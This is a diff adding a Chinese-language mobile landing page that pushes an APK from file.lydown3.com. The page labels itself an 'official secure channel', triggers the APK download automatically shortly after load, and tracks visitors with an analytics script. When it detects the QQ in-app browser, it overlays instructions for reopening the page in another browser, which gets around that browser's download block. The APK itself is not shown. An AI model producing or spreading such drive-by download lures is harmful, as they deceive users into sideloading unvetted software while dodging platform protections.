@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>正在为您准备下载...</title>
+  <script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "PingFang SC", "Microsoft YaHei", sans-serif;
+      background: #f5f7fa;
+      color: #1f2937;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    .card {
+      background: #ffffff;
+      width: 100%;
+      max-width: 400px;
+      border-radius: 16px;
+      padding: 28px 22px;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.06);
+      text-align: center;
+    }
+    .badge {
+      display: inline-block;
+      background: #eef2ff;
+      color: #4f46e5;
+      font-size: 13px;
+      font-weight: 600;
+      padding: 5px 12px;
+      border-radius: 999px;
+      margin-bottom: 14px;
+    }
+    h1 { font-size: 20px; margin-bottom: 10px; }
+    p { font-size: 14px; color: #6b7280; line-height: 1.6; margin-bottom: 20px; }
+    .btn {
+      display: block;
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 12px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      text-decoration: none;
+      margin-bottom: 12px;
+    }
+    .btn-primary { background: #4f46e5; color: #ffffff; }
+    .btn-secondary { background: #f3f4f6; color: #374151; font-size: 14px; }
+    .tip { font-size: 12px; color: #9ca3af; margin-top: 8px; }
+
+    #qq-mask {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.85);
+      color: #ffffff;
+      z-index: 9999;
+      padding: 28px 24px;
+      text-align: right;
+    }
+    #qq-mask .arrow { font-size: 36px; margin-bottom: 10px; }
+    #qq-mask .box {
+      text-align: left;
+      background: rgba(255, 255, 255, 0.12);
+      border-radius: 14px;
+      padding: 20px;
+      margin-top: 12px;
+      line-height: 1.8;
+      font-size: 15px;
+    }
+    #qq-mask button {
+      margin-top: 16px;
+      width: 100%;
+      padding: 12px;
+      border-radius: 10px;
+      border: none;
+      background: #4f46e5;
+      color: #fff;
+      font-size: 15px;
+      font-weight: 600;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <div class="badge">官方安全通道</div>
+    <h1>安装包已就绪</h1>
+    <p>若浏览器未自动开始下载，请点击下方蓝色按钮手动启动下载。</p>
+    <a id="download-btn" class="btn btn-primary" href="http://file.lydown3.com/android/mp/channel/huak18/35963/0f0419.apk">立即下载安装包</a>
+    <button class="btn btn-secondary" onclick="copyPageUrl()">一键复制当前网址</button>
+    <div id="copy-status" class="tip">建议在手机自带浏览器中打开此页面</div>
+  </div>
+
+  <div id="qq-mask">
+    <div class="arrow">↗</div>
+    <div class="box">
+      <strong>QQ 内置浏览器无法直接下载</strong><br />
+      1. 请点击右上角 <b>“···”</b> 或 <b>浏览器图标</b><br />
+      2. 选择 <b>“在浏览器打开”</b> 即可正常下载<br />
+      3. 或者点击下方按钮复制网址，粘贴到手机浏览器打开
+      <button onclick="copyPageUrl()">一键复制网址去浏览器</button>
+    </div>
+  </div>
+
+  <script>
+    var apkUrl = "http://file.lydown3.com/android/mp/channel/huak18/35963/0f0419.apk";
+    var ua = navigator.userAgent.toLowerCase();
+    var isQQ = ua.indexOf("qq/") > -1 || ua.indexOf("mqqbrowser") > -1;
+
+    if (isQQ && ua.indexOf("micromessenger") === -1) {
+      document.getElementById("qq-mask").style.display = "block";
+    } else {
+      setTimeout(function () {
+        window.location.href = apkUrl;
+      }, 800);
+    }
+
+    function copyPageUrl() {
+      var url = window.location.href;
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(url).then(function () {
+          alert("网址已复制！请打开手机自带浏览器粘贴访问");
+        });
+      } else {
+        var input = document.createElement("input");
+        input.value = url;
+        document.body.appendChild(input);
+        input.select();
+        document.execCommand("copy");
+        document.body.removeChild(input);
+        alert("网址已复制！请打开手机自带浏览器粘贴访问");
+      }
+    }
+  </script>
+</body>
+</html>
